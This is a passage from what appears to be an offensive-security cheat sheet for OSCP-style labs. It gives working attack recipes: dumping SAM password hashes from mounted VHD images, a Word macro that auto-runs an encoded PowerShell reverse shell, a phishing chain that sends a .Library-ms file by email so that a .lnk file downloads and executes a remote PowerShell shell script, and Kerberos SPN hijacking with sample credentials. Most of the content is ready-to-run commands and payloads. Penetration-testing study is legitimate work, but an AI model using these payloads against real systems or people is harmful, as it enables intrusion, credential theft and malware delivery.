# Step 2: OPTION 1: list the content of the .vhd or .vhdx file (using 7zip) or extract it
7z l <path_to_vhd_or_vhdx_file>
7z x <path_to_vhd_or_vhdx_file> -o<output_folder>

# Step 2: OPTION 2: mount the .vhd or .vhdx file using 'guestmount'
# install libguestfs-tools if not already installed
sudo apt-get install libguestfs-tools

# mount the .vhd or .vhdx file (read-only)
sudo guestmount --add /path/to/mounted/file.vhd --inspector --ro -v /mnt/local_vhd_mountpoint

# Step 3: navigate to '/mnt/local_vhd_mountpoint/Windows/system32/config' and extract the hashes from the installation
cd /mnt/local_vhd_mountpoint/Windows/System32/config

# Retrieve the hashes of the vhd/vhdx installation
secretsdump.py -sam SAM -system SYSTEM LOCAL

# NOTE:
# 1. The first part of the hash (aad3b435b51404eeaad3b435b51404ee) is not used anymore, therefore it will always have the same value
# 2. When the second part of the hash starts with '31d6' - it is a blank password
# 3. when on a DC - also retrieve the ntds.dit file

##### END EXPLOITATION
```
{% endraw %}

### Malicious macro file (.doc)

Generate a malicious macro file

{% raw %}
```bash
##### REQUIREMENTS:
# Software that can generate a .doc file with macros, e.g. Microsoft Word or LibreOffice

##### REFERENCE:
# OSCP course: client-side attacks
# PG-box: hepet (libreoffice - malicious macro https://github.com/0bfxgh0st/MMG-LO)

##### START exploitation
# 1. Create a word file with the .doc format (Word 97-2003 Document)
mymacro.doc

# 2. Open the document in Word and within the menu
A. Click on 'View' in the navbar
B. Click on 'Macros' (right side after clicking on view)

# 3. Create the macro
A. Fill in the macro name under 'Macro name', e.g. 'MyMacro.doc'
B. Select the 'Macros in' option to be 'mymacro.doc' (Dropdown menu - name of the file)
C. Click on 'Create' 

# 4. Once navigated to the 'Microsoft Visual Basic for Applications' screen, do as follows
A. Add the following code for opening a basic "powershell" terminal
# --- START --- #
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
# --- END --- #

B. Click on the save icon to save the VBS Macro
C. Reopen the document to test it - a powershell prompt should appear

# 5. RESOURCES

# 5A. Character limit of VBS is 255 characters (except for variables)
# use the underlying script (python) to create a string variable with the command that is going to be used.

# --- START --- #
str="powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIAB...."
n=50

for ((i=0; i<${#str}; i+=n)); do
    echo "Str = Str + \"${str:i:n}\""
done
# --- END --- #

# 5B. Reverse shell payload example:
# --- START --- #
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()
  Dim Str As String
  Str = Str + "powershell.exe -nop -w hidden -enc "

  Str = Str + "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYw"
  Str = Str + "B0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0"
  Str = Str + "AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxAD"
  Str = Str + "YAOAAuADQANQAuADEANgAxACIALAA4ADAAKQA7ACQAcwB0AHIA"
  Str = Str + "ZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdA"
  Str = Str + "ByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0"
  Str = Str + "AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9AD"
  Str = Str + "sAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEA"
  Str = Str + "bQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJA"
  Str = Str + "BiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAg"
  Str = Str + "ADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAG"
  Str = Str + "IAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMA"
  Str = Str + "dABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZA"
  Str = Str + "BpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0"
  Str = Str + "AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAG"
  Str = Str + "sAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEA"
  Str = Str + "IAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQ"
  Str = Str + "BuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBr"
  Str = Str + "ACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAG"
  Str = Str + "EAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQA"
  Str = Str + "ZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZw"
  Str = Str + "BdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAo"
  Str = Str + "ACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG"
  Str = Str + "0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAA"
  Str = Str + "LAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOw"
  Str = Str + "AkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABj"
  Str = Str + "AGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
  
  CreateObject("Wscript.Shell").Run Str
  
End Sub
# --- END --- #

##### END EXPLOITATION
```
{% endraw %}

### Malicious windows lib (.Library-ms)

Generate a malicious windows .Library-ms and .lnk file to achieve code execution

{% raw %}
```bash
##### REQUIREMENTS:
# 1. 'config.Library-ms', 'automatic_config.lnk' and 'Invoke-PowerShellTcp.ps1' served on a webdav share
# 2. A way to deliver the config.Library-ms file, so it mounts the webdav share and the user executes the automatic_config.lnk file

##### REFERENCE:
# https://hadi-al-halbouni.medium.com/oscp-survival-notes-701ee82aa0e

##### START exploitation

# Summary of the attack
A. You serve 'config.Library-ms', 'automatic_config.lnk' and 'Invoke-PowerShellTcp.ps1' on a webdav server
B. You set up a listener with nc
C. You deliver the 'config.Library-ms' (through SMTP or SMB) to the target
D. When the target user clicks on the 'config.Library-ms' file, it will automatically mount the target webdav server
E. The user sees the .lnk file, clicks on it
F. Code execution is achieved              

# 1. Setup a webdav service on your kali system - run on port 80
pip3 install wsgidav --break-system-packages
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /mnt/webdav # /mnt/webdav = mountpoint on your system

# 2. Create the malicious config-library.ms file (save in webdav root)
A. Create an empty file with the name 'config.Library-ms'
B. Add the following (make sure to adjust your IP)

# --- START --- #
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
	<name>@windows.storage.dll,-34582</name>
	<version>6</version>
	<isLibraryPinned>true</isLibraryPinned>
	<iconReference>imageres.dll,-1000</iconReference>
	<templateInfo>
	<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	<searchConnectorDescriptionList>
		<searchConnectorDescription>
			<isDefaultSaveLocation>true</isDefaultSaveLocation>
			<isSupported>false</isSupported>
			<simpleLocation>
				<url>http://§LHOST§</url>
			</simpleLocation>
		</searchConnectorDescription>
	</searchConnectorDescriptionList>
</libraryDescription>
# --- END --- #

# 3. Create a '.lnk' file with the following content (windows shortcut) - also setup a listener and a webserver
# (save in webdav root)
powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://§LHOST§:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress §LHOST§ -Port §LPORT§"
rlwrap nc -lvnp §LPORT§

# 4. Save the script 'Invoke-PowerShellTcp.ps1' to your webdav root
cp Invoke-PowerShellTcp.ps1 /mnt/webdav

# 5A. Deliver using SWAKS (SMTP - port 25/587)
# use --port if needed to specify a different port
swaks --to RECIEVER@example.com --from SENDER@example.com -ap --attach @config.Library-ms --server §RHOST§ --body @config.Library-ms --header "Subject: Urgent Configuration Setup"

##### END EXPLOITATION
```
{% endraw %}

### SPN Hijacking

Hijack SPNs to impersonate a privileged user and obtain a service ticket for a high-value target in the domain.

{% raw %}
```bash
##### REQUIREMENTS:
# 1. Write access to SPNs on both the source and target computer/user accounts
# 2. Constrained delegation (with or without protocol transition) configured for the SPNs you control
# 3. The ability to impersonate a privileged user (not in Protected Users / not marked as sensitive)

##### REFERENCE:
# https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained

##### START exploitation

# Summary of the attack
# Move SPNs from a low-value target (e.g., WEB01$) to a high-value target (e.g., DC01$).
# Since constrained delegation allows impersonation to those SPNs, you can now obtain
# a service ticket for the DC by impersonating a privileged user.

# 1. show SPNs listed in the KCD configuration
findDelegation.py "§DOMAIN§.§ROOTDNS§"/"§USERNAME§":'§PASSWORD§'

# 2. view the SPN's of machine_account_1$ and machine_account_2$
addspn -u '§DOMAIN§\§USERNAME§' -p '§PASSWORD§' -t 'machine_account_1$' -q '§RHOST§'
addspn -u '§DOMAIN§\§USERNAME§' -p '§PASSWORD§' -t 'machine_account_2$' -q '§RHOST§'

# 3. remove specific SPNs from machine_account_1$ (-r option)
addspn -u '§DOMAIN§\§USERNAME§' -p '§PASSWORD§' -t 'machine_account_1$' -s 'REMOVE/SPN.§DOMAIN§.§ROOTDNS§' -r §HOSTNAME§.§DOMAIN§.§ROOTDNS§
addspn -u '§DOMAIN§\§USERNAME§' -p '§PASSWORD§' -t 'machine_account_1$' -s 'REMOVE/SPN.§DOMAIN§.§ROOTDNS§' -r §HOSTNAME§.§DOMAIN§.§ROOTDNS§

# 4. add the removed SPNs from step 3 to machine_account_2$
addspn -u '§DOMAIN§\§USERNAME§' -p '§PASSWORD§' -t 'machine_account_2$' -s 'ADD/SPN.§DOMAIN§.§ROOTDNS§' §HOSTNAME§.§DOMAIN§.§ROOTDNS§
addspn -u '§DOMAIN§\§USERNAME§' -p '§PASSWORD§' -t 'machine_account_2$' -s 'ADD/SPN.§DOMAIN§.§ROOTDNS§' §HOSTNAME§.§DOMAIN§.§ROOTDNS§

# 5. request a service ticket, as the administrator user, since the user a.white_adm has delegationrights to the 'HTTP/WEB01.pirate.htb' and 'HTTP/WEB01' SPN
impacket-getST -spn '<PROTO>/§HOSTNAME§.§DOMAIN§.§ROOTDNS§' -impersonate "administrator" '§DOMAIN§'/'§USERNAME§':'§PASSWORD§' -altservice 'CIFS/§HOSTNAME§.§DOMAIN§.§ROOTDNS§' -dc-ip §RHOST§

### --- EXAMPLE SCENARIO --- ###
# 1. show SPNs listed in the KCD configuration
findDelegation.py "pirate.htb"/"a.white_adm":'Password@123'

# OUTPUT: 
# AccountName	AccountType	DelegationType					DelegationRightsTo		SPN 
# -----------		-----------			----------------------------------				---------------------			----------
# DC01$		Computer		Unconstrained					N/A					Yes        
# a.white_adm	Person			Constrained w/ Protocol Transition	http/WEB01.pirate.htb	Yes        
# a.white_adm	Person			Constrained w/ Protocol Transition	HTTP/WEB01			Yes

# 2. view the SPN's of web01$ and dc01$
addspn -u 'pirate\a.white_adm' -p 'Password@123' -t 'web01$' -q '10.129.17.89'
addspn -u 'pirate\a.white_adm' -p 'Password@123' -t 'dc01$' -q '10.129.17.89'

# 3. remove the 'HTTP/WEB01.pirate.htb' SPN and 'HTTP/WEB01' from web01$
addspn -u 'pirate\a.white_adm' -p 'Password@123' -t 'web01$' -s 'HTTP/WEB01.pirate.htb' -r dc01.pirate.htb
addspn -u 'pirate\a.white_adm' -p 'Password@123' -t 'web01$' -s 'HTTP/WEB01' -r dc01.pirate.htb

# 4. add the 'HTTP/WEB01.pirate.htb' SPN and 'HTTP/WEB01' to dc01$
addspn -u 'pirate\a.white_adm' -p 'Password@123' -t 'dc01$' -s 'HTTP/WEB01.pirate.htb' dc01.pirate.htb
addspn -u 'pirate\a.white_adm' -p 'Password@123' -t 'dc01$' -s 'HTTP/WEB01' dc01.pirate.htb

# 5. request a service ticket, as the administrator user, since the user a.white_adm has delegationrights to the 'HTTP/WEB01.pirate.htb' and 'HTTP/WEB01' SPN
impacket-getST -spn 'HTTP/WEB01.pirate.htb' -impersonate "administrator" 'pirate'/'a.white_adm':'Password@123' -altservice 'CIFS/DC01.pirate.htb' -dc-ip 10.129.17.89
### --- EXAMPLE SCENARIO --- ###

##### END EXPLOITATION
```
{% endraw %}
